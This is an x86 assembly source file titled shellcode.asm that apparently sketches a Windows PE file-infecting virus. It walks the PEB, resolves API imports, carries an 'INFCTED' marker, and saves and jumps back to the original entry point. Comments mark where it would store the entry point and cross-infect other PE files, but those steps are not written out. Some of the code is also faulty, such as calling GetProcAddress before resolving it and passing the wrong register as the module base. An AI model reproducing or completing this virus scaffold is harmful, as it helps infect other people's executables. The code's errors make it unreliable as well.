; shellcode.asm

GET_PEB MACRO
    xor eax, eax
    mov eax, fs:[0x30]
ENDM

RESOLVE_IMPORT MACRO R_BASE, STR_RVA, OUT_PTR
    push STR_RVA
    push R_BASE
    call GetProcAddress
    mov [OUT_PTR], eax
ENDM

.DATA
modKernel32      db "KERNEL32.DLL",0
modUser32        db "USER32.DLL",0
strLoadLibraryA  db "LoadLibraryA",0
strGetProcAddress db "GetProcAddress",0
strFreeLibrary   db "FreeLibrary",0
strMessageBoxA   db "MessageBoxA",0
infectMarker     db "INFCTED",0

.DATA?
pLoadLibraryA    dd ?
pGetProcAddress  dd ?
pFreeLibrary     dd ?
pMessageBoxA     dd ?
origOEP          dd ?

.CODE
start:
    GET_PEB
    mov eax, [eax+0x0C]
    mov esi, [eax+0x1C]
.next_mod:
    mov ebx, [esi+0x08]

    RESOLVE_IMPORT eax, OFFSET strLoadLibraryA, pLoadLibraryA
    RESOLVE_IMPORT eax, OFFSET strGetProcAddress, pGetProcAddress
    RESOLVE_IMPORT eax, OFFSET strFreeLibrary, pFreeLibrary

    push OFFSET modUser32
    call [pLoadLibraryA]
    mov ebx, eax
    RESOLVE_IMPORT ebx, OFFSET strMessageBoxA, pMessageBoxA

    ; store original entry point
    ; cross-infect other PE files

    push MB_OK or MB_ICONWARNING
    push OFFSET infectMarker
    push OFFSET infectMarker
    push 0
    call [pMessageBoxA]

    jmp [origOEP]
END start
